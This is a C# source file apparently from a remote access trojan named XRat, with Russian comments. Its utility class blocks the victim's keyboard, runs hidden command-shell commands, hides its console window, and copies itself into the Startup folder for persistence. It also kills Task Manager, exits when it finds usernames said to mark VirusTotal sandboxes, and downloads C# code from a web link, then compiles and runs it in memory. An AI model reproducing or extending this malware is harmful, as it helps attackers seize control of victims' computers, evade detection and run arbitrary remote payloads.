using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms.Design;
using HtmlAgilityPack;

namespace XRat
{
    public static class Utils
    {
        // Подключаем необходимые Windows API
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0; // Скрыть окно
        const int SW_SHOW = 5; // Показать окно

        [DllImport("user32.dll")]
        private static extern int BlockInput(int fBlockIt);

        public static void BlockKeyboard()
        {
            // Блокируем клавиатуру
            BlockInput(1);
        }

        public static void UnblockKeyboard()
        {
            // Разблокируем клавиатуру
            BlockInput(0);
        }

        public static bool CMD(string command)
        {
            // Start the CMD process with /min flag to run it minimized
            var processStartInfo = new ProcessStartInfo
            {
                FileName = "CMD.exe",
                Arguments = $"/min /C {command}",  // /min to minimize the CMD window, /C to execute and then terminate CMD
                RedirectStandardOutput = true, // Optionally capture output
                RedirectStandardError = true,  // Optionally capture errors
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var process = Process.Start(processStartInfo))
                {
                    if (process == null)
                    {
                        throw new InvalidOperationException("Failed to start CMD.exe process.");
                    }

                    // Wait for the process to exit
                    process.WaitForExit();
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        public static (bool success, string output) ProCMD(string command)
        {
            string output = string.Empty;

            // Start the CMD process with /min flag to run it minimized
            var processStartInfo = new ProcessStartInfo
            {
                FileName = "CMD.exe",
                Arguments = $"/min /C {command}",  // /min to minimize the CMD window, /C to execute and then terminate CMD
                RedirectStandardOutput = true, // Optionally capture output
                RedirectStandardError = true,  // Optionally capture errors
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var process = Process.Start(processStartInfo))
                {
                    if (process == null)
                    {
                        throw new InvalidOperationException("Failed to start CMD.exe process.");
                    }

                    // Read the standard output
                    output = process.StandardOutput.ReadToEnd();

                    // Optionally, you can also capture errors
                    string errorOutput = process.StandardError.ReadToEnd();

                    // Wait for the process to exit
                    process.WaitForExit();
                }

                return (true, output); // Return success and the output string
            }
            catch (Exception ex)
            {
                return (false, $"Error: {ex.Message}"); // Return failure and the error message
            }
        }

        public static bool Hide()
        {
            // Получаем дескриптор консольного окна
            IntPtr hConsole = GetConsoleWindow();

            try
            {
                // Скрываем консольное окно
                ShowWindow(hConsole, SW_HIDE);
            }
            catch { return false; }

            return true;
        }

        public static bool Show()
        {
            // Получаем дескриптор консольного окна
            IntPtr hConsole = GetConsoleWindow();

            try
            {
                // Вернуть окно обратно:
                ShowWindow(hConsole, SW_SHOW);
            }
            catch { return false; }

            return true;
        }

        public static string Startup()
        {
            Settings.filename = Settings.filename + ".exe";

            // Получаем путь к папке автозагрузки текущего пользователя
            string userStartupFolder = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup)
            );

            // Получаем имя файла (с расширением)
            string sourceFilePath = ProCMD("pwd").output;
            sourceFilePath = sourceFilePath + Settings.filename; // Исправить!!!!!

            // Путь, куда будет скопирован файл
            string destinationFilePath = Path.Combine(userStartupFolder, Settings.filename);

            // Копируем файл в папку автозагрузки, если он не существует там
            try
            {
                if (!File.Exists(destinationFilePath))
                {
                    // Копирование самого себя в папку автозагрузки
                    File.Copy(sourceFilePath, destinationFilePath);
                    return $"Программа успешно скопирована в автозагрузку: {destinationFilePath}";
                }
                else
                {
                    return "Программа уже существует в папке автозагрузки.";
                }
            }
            catch (Exception ex)
            {
                return $"Произошла ошибка: {ex.Message}";
            }
        }

        public static Task Taskmgr()
        {
            CMD(@"taskkill.exe /IM taskmgr.exe");
            return Task.CompletedTask;
        }

        public static void CheckVirusTotal()
        {
            string[] virusTotalUsers = ["azure", "abby", "george", "bruno", "rtucker", "john", "administrator", "anrose"];

            string username = ProCMD("whoami").output;
            username = username.Split('\\')[1];

            if (virusTotalUsers.Contains(username))
            {
                Environment.Exit(0); // Leaving if it's VirusTotal VM
            }
        }

        public static async Task<string> ParseCodeFromRawLink(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Получаем HTML-контент страницы
                    string htmlContent = await client.GetStringAsync(url);

                    // Создаем объект HtmlDocument для парсинга HTML
                    var htmlDocument = new HtmlDocument();
                    htmlDocument.LoadHtml(htmlContent);

                    // Извлекаем все теги <pre>
                    var preTags = htmlDocument.DocumentNode.SelectNodes("//pre");

                    // Если теги <pre> найдены, возвращаем содержимое первого
                    if (preTags != null && preTags.Count > 0)
                    {
                        return preTags[0].InnerText; // Возвращаем текст первого тега <pre>
                    }
                    else
                    {
                        // Если теги <pre> не найдены, возвращаем пустую строку
                        return string.Empty;
                    }
                }
                catch (Exception ex)
                {
                    // Логируем ошибку
                    // Console.WriteLine($"Произошла ошибка при скачивании или парсинге страницы: {ex.Message}");

                    // Возвращаем пустую строку в случае ошибки
                    return string.Empty;
                }
            }
        }

        public static async Task ModuleLoader(string link)
        {
            await ExecuteCodeFromText(await ParseCodeFromRawLink(link));
        }
        public static async Task ExecuteCodeFromText(string code)
        {
            await Task.Run(() =>
            {
                // Создание компилятора
                CSharpCodeProvider provider = new CSharpCodeProvider();

                // Настройка параметров компиляции
                CompilerParameters parameters = new CompilerParameters
                {
                    GenerateExecutable = false,
                    GenerateInMemory = true
                };

                // Компиляция кода
                CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

                // Проверка наличия ошибок компиляции
                if (results.Errors.HasErrors)
                {
                    //Console.WriteLine("Ошибка компиляции:");
                    foreach (CompilerError error in results.Errors)
                    {
                        //Console.WriteLine("  {0}", error.ErrorText);
                    }
                }
                else
                {
                    // Создание экземпляра класса и вызов метода
                    Assembly assembly = results.CompiledAssembly;
                    Type type = assembly.GetType("UserClass");
                    if (type != null)
                    {
                        dynamic instance = Activator.CreateInstance(type);
                        instance.Execute();
                    }
                    else
                    {
                        //Console.WriteLine("Не найден класс UserClass.");
                    }
                }
            });
        }
    }
}